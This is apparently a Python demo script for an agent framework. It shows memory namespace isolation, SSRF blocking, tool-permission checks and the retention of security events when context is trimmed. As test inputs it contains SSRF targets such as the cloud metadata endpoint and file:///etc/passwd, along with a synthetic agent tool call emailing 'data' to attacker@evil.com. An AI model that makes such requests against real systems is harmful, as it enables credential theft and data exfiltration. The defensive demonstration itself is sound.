#!/usr/bin/env python3
"""Live demo: Memory Isolation, SSRF + Permissions, Security Event Trimming.

Three-step demo showing agent-framework security features.
Pauses between sections so you can narrate. Press Enter to advance.

Usage:
    uv run python scripts/demo_live.py               # Run all 3 steps (interactive)
    uv run python scripts/demo_live.py memory         # Step 1 only
    uv run python scripts/demo_live.py ssrf           # Step 2 only
    uv run python scripts/demo_live.py trimming       # Step 3 only
    uv run python scripts/demo_live.py --no-pause     # Run all, skip pauses
"""

import asyncio
import os
import sys
from pathlib import Path

# Ensure project root and fix sys.path so scripts/mcp/ doesn't shadow the mcp package
project_root = Path(__file__).parent.parent
os.chdir(project_root)
scripts_dir = str(Path(__file__).parent.resolve())
sys.path = [p for p in sys.path if p != scripts_dir]

from agent_framework.permissions.context import ExecutionContext  # noqa: E402
from agent_framework.permissions.identity import AgentIdentity  # noqa: E402
from agent_framework.permissions.permissions import Permission, PermissionSet  # noqa: E402
from agent_framework.permissions.tool_permissions import (  # noqa: E402
    check_tool_permission,
    get_required_permissions,
)
from agent_framework.security.context_trimming import (  # noqa: E402
    SECURITY_EVENT_KEY,
    SecurityClassification,
    classify_message,
    trim_with_security_awareness,
)
from agent_framework.security.ssrf import SSRFValidator  # noqa: E402
from agent_framework.tools.memory import delete_memory, save_memory, search_memories  # noqa: E402

# ── Formatting helpers ───────────────────────────────────────────────────────

BOLD = "\033[1m"
DIM = "\033[2m"
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
RESET = "\033[0m"


def banner(step: int, title: str, subtitle: str) -> None:
    width = 64
    print()
    print(f"{CYAN}{'━' * width}{RESET}")
    print(f"{CYAN}  {BOLD}Step {step}{RESET}{CYAN} │ {title}{RESET}")
    print(f"{DIM}  {subtitle}{RESET}")
    print(f"{CYAN}{'━' * width}{RESET}")
    print()


def ok(msg: str) -> None:
    print(f"  {GREEN}✓{RESET} {msg}")


def blocked(msg: str) -> None:
    print(f"  {RED}✗{RESET} {msg}")


def info(msg: str) -> None:
    print(f"  {DIM}→{RESET} {msg}")


def pause(msg: str = "continue") -> None:
    """Wait for Enter key. Pass --no-pause to skip all pauses."""
    if "--no-pause" in sys.argv:
        return
    try:
        input(f"\n  {DIM}[Enter to {msg}]{RESET}")
    except (EOFError, KeyboardInterrupt):
        print()
        sys.exit(0)


def section(title: str) -> None:
    print(f"\n  {YELLOW}{BOLD}{title}{RESET}")
    print(f"  {YELLOW}{'─' * len(title)}{RESET}")


# ═══════════════════════════════════════════════════════════════════════════════
# STEP 1: Memory Namespace Isolation
# ═══════════════════════════════════════════════════════════════════════════════


async def demo_memory_namespace() -> None:
    banner(1, "Memory Namespace Isolation", "Same query, two agents, different results")

    agent_a = "DemoAgent-Alpha"
    agent_b = "DemoAgent-Beta"

    try:
        # ── Save memories under each namespace ──────────────────────────────
        section("Saving memories into two namespaces")
        pause("save memories")

        await save_memory(
            key="demo-project-status",
            value="Alpha team: launching rocket to Mars next quarter",
            category="project",
            importance=8,
            agent_name=agent_a,
        )
        ok(f'{agent_a} saved: "launching rocket to Mars next quarter"')

        await save_memory(
            key="demo-project-status",
            value="Beta team: building underwater data center in the Pacific",
            category="project",
            importance=8,
            agent_name=agent_b,
        )
        ok(f'{agent_b} saved: "building underwater data center in the Pacific"')

        # ── Search with the same query from each namespace ──────────────────
        section('Searching both namespaces for "project"')
        pause("search both namespaces")

        result_a = await search_memories(query="project", agent_name=agent_a)
        result_b = await search_memories(query="project", agent_name=agent_b)

        memories_a = result_a.get("memories", [])
        memories_b = result_b.get("memories", [])

        info(f"{agent_a} sees {len(memories_a)} result(s):")
        for m in memories_a:
            print(f"    {CYAN}{m['key']}{RESET}: {m['value']}")

        info(f"{agent_b} sees {len(memories_b)} result(s):")
        for m in memories_b:
            print(f"    {CYAN}{m['key']}{RESET}: {m['value']}")

        # ── Cross-namespace check ───────────────────────────────────────────
        section("Cross-namespace verification")
        pause("test cross-namespace isolation")

        # Search Agent A's namespace for Agent B's content
        cross = await search_memories(query="underwater", agent_name=agent_a)
        cross_results = cross.get("memories", [])
        if not cross_results:
            ok(f'{agent_a} searching "underwater" → 0 results (isolation works)')
        else:
            blocked(f"{agent_a} found {len(cross_results)} result(s) — isolation broken!")

    finally:
        # ── Cleanup (runs even on error/Ctrl-C) ────────────────────────────
        await delete_memory(key="demo-project-status", agent_name=agent_a)
        await delete_memory(key="demo-project-status", agent_name=agent_b)
        info("Cleaned up demo memories")


# ═══════════════════════════════════════════════════════════════════════════════
# STEP 2: SSRF + Permission Denial
# ═══════════════════════════════════════════════════════════════════════════════


async def demo_ssrf_permissions() -> None:
    banner(2, "SSRF + Permission Denial", "Capability bounding — blocked at multiple layers")

    # ── Layer 1: SSRF URL Validation ────────────────────────────────────────
    section("Layer 1 — SSRF URL validation")
    pause("test SSRF validation")

    test_urls = [
        ("https://example.com/api/data", "legitimate external URL"),
        ("http://192.168.1.1/admin", "private network IP"),
        ("http://169.254.169.254/latest/meta-data/", "AWS metadata endpoint"),
        ("http://localhost:8080/internal", "localhost"),
        ("file:///etc/passwd", "file:// scheme"),
    ]

    for url, description in test_urls:
        is_safe, reason = SSRFValidator.is_safe_url(url)
        if is_safe:
            ok(f"{description}: allowed")
        else:
            blocked(f"{description}: {reason}")

    # ── Layer 2: Permission enforcement ─────────────────────────────────────
    section("Layer 2 — Tool permission enforcement")
    pause("show permission requirements")

    # Show what permissions each tool requires
    tools_to_check = [
        "fetch_web_content",
        "save_memory",
        "send_email",
        "run_claude_code",
        "delete_email",
    ]
    info("Tool permission requirements:")
    for tool in tools_to_check:
        perms = get_required_permissions(tool)
        perm_names = sorted(p.name for p in perms)
        print(f"    {tool:30s} → {', '.join(perm_names)}")

    # Show what an email-triggered agent CAN and CANNOT do
    section("Layer 2 — Email-triggered agent (READ + SEND only)")
    pause("test email agent permissions")

    email_perms = {Permission.READ, Permission.SEND}
    email_tools = [
        "fetch_web_content",  # READ → allowed
        "search_memories",  # READ → allowed
        "save_memory",  # WRITE → denied
        "send_email",  # SEND → allowed
        "delete_email",  # DELETE → denied
        "run_claude_code",  # EXECUTE → denied
    ]

    for tool in email_tools:
        allowed, missing = check_tool_permission(tool, email_perms)
        if allowed:
            ok(f"{tool}: allowed")
        else:
            missing_names = sorted(p.name for p in missing)
            blocked(f"{tool}: denied (missing {', '.join(missing_names)})")

    # ── Layer 3: Permission intersection on delegation ──────────────────────
    section("Layer 3 — Permission intersection on delegation")
    pause("show delegation intersection")

    # Email intake agent (READ + SEND) delegates to code reviewer (full access)
    intake_ctx = ExecutionContext(
        caller=AgentIdentity(name="EmailIntakeAgent", source="email"),
        permissions=PermissionSet([Permission.READ, Permission.SEND]),
    )
    info(f"Caller:    {intake_ctx.caller.name} has {intake_ctx.permissions}")

    delegated_ctx = intake_ctx.delegate_to(
        agent_name="CodeReviewAgent",
        agent_permissions=PermissionSet.full_access(),
    )
    info(f"Delegated: {delegated_ctx.caller.name} gets {delegated_ctx.permissions}")
    info(f"Chain:     {delegated_ctx.get_chain_summary()}")

    # The code reviewer can only READ + SEND (intersected with caller)
    can_read = delegated_ctx.can(Permission.READ)
    can_write = delegated_ctx.can(Permission.WRITE)
    can_execute = delegated_ctx.can(Permission.EXECUTE)

    if can_read:
        ok("CodeReviewAgent can READ (inherited from caller)")
    if not can_write:
        blocked("CodeReviewAgent cannot WRITE (caller didn't have it)")
    if not can_execute:
        blocked("CodeReviewAgent cannot EXECUTE (caller didn't have it)")


# ═══════════════════════════════════════════════════════════════════════════════
# STEP 3: Security Events Survive Trimming
# ═══════════════════════════════════════════════════════════════════════════════


async def demo_security_trimming() -> None:
    banner(3, "Security Events Survive Trimming", "Long conversation, pinned events persist")

    # Build a synthetic conversation with 44 messages (mix of normal + security)
    messages: list[dict] = []

    # Normal conversation padding (turns 1-10)
    for i in range(10):
        messages.append({"role": "user", "content": f"Tell me about topic {i}"})
        messages.append({"role": "assistant", "content": f"Here's information about topic {i}..."})

    # ── Insert a security event at turn 11 (SSRF block) ────────────────────
    # Tool use (assistant) → tool result with security tag (user)
    messages.append(
        {
            "role": "assistant",
            "content": [
                {
                    "type": "tool_use",
                    "id": "toolu_ssrf",
                    "name": "fetch_web_content",
                    "input": {"url": "http://169.254.169.254/latest/meta-data/"},
                }
            ],
        }
    )
    messages.append(
        {
            "role": "user",
            "content": [
                {
                    "type": "tool_result",
                    "tool_use_id": "toolu_ssrf",
                    "content": "URL not allowed: Cloud metadata endpoint: 169.254.169.254",
                    "is_error": True,
                    SECURITY_EVENT_KEY: "ssrf_block",
                }
            ],
        }
    )

    # More normal conversation padding (turns 12-16)
    for i in range(10, 15):
        messages.append({"role": "user", "content": f"Now let's discuss topic {i}"})
        messages.append({"role": "assistant", "content": f"Sure, about topic {i}..."})

    # ── Insert a permission denial at turn 17 ──────────────────────────────
    messages.append(
        {
            "role": "assistant",
            "content": [
                {
                    "type": "tool_use",
                    "id": "toolu_perm",
                    "name": "send_email",
                    "input": {"to": "attacker@evil.com", "subject": "data"},
                }
            ],
        }
    )
    messages.append(
        {
            "role": "user",
            "content": [
                {
                    "type": "tool_result",
                    "tool_use_id": "toolu_perm",
                    "content": "Permission denied: EmailIntakeAgent cannot execute 'send_email'. Required permissions: ['SEND']. Missing: ['SEND'].",
                    "is_error": True,
                    SECURITY_EVENT_KEY: "permission_denied",
                }
            ],
        }
    )

    # More padding (turns 18-22)
    for i in range(15, 20):
        messages.append({"role": "user", "content": f"Another question about {i}"})
        messages.append({"role": "assistant", "content": f"Here's the answer for {i}..."})

    total = len(messages)

    section(f"Built conversation: {total} messages")
    info(f"Normal messages: {total - 4}")
    info("Security events: 2 (SSRF block + permission denial)")

    # ── Show classification before trimming ─────────────────────────────────
    section("Message classification")
    pause("classify messages")
    critical_count = 0
    for i, msg in enumerate(messages):
        cm = classify_message(msg)
        if cm.classification == SecurityClassification.CRITICAL:
            critical_count += 1
            ok(f"Message {i:2d} [{msg['role']:9s}] → CRITICAL ({', '.join(cm.reasons)})")

    info(f"{critical_count} messages classified as CRITICAL, rest are NORMAL")

    # ── Trim to 20 messages ─────────────────────────────────────────────────
    target = 20
    section(f"Trimming from {total} → {target} messages")
    pause("trim conversation")

    trimmed, num_removed, num_pinned = trim_with_security_awareness(messages, max_messages=target)

    info(f"Messages removed: {num_removed}")
    info(f"Messages pinned:  {num_pinned}")
    info(f"Final count:      {len(trimmed)}")

    # ── Verify security events survived ─────────────────────────────────────
    section("Verifying security events survived")
    pause("verify results")

    surviving_critical = 0
    for msg in trimmed:
        cm = classify_message(msg)
        if cm.classification == SecurityClassification.CRITICAL:
            surviving_critical += 1
            ok(f"Survived: [{msg['role']:9s}] {', '.join(cm.reasons)}")

    if surviving_critical >= 2:
        print()
        ok(f"{BOLD}All security events survived trimming!{RESET}")
        info(f"{total - len(trimmed)} normal messages were trimmed, security events were pinned")
    else:
        blocked("Some security events were lost!")


# ═══════════════════════════════════════════════════════════════════════════════
# Main
# ═══════════════════════════════════════════════════════════════════════════════

DEMOS = {
    "memory": demo_memory_namespace,
    "ssrf": demo_ssrf_permissions,
    "trimming": demo_security_trimming,
}


async def main() -> None:
    args = [a for a in sys.argv[1:] if not a.startswith("--")]
    step = args[0] if args else None

    if step and step not in DEMOS:
        print(f"Unknown step: {step}")
        print(f"Available: {', '.join(DEMOS.keys())}")
        sys.exit(1)

    print(f"\n{BOLD}{CYAN}  ╔══════════════════════════════════════════════════════════╗{RESET}")
    print(f"{BOLD}{CYAN}  ║              Agent Framework — Live Demo                 ║{RESET}")
    print(f"{BOLD}{CYAN}  ╚══════════════════════════════════════════════════════════╝{RESET}")

    if step:
        await DEMOS[step]()
    else:
        demo_list = list(DEMOS.values())
        for i, demo_fn in enumerate(demo_list):
            await demo_fn()
            if i < len(demo_list) - 1:
                pause("next demo")

    print(f"\n{GREEN}{BOLD}  Demo complete.{RESET}\n")


if __name__ == "__main__":
    asyncio.run(main())
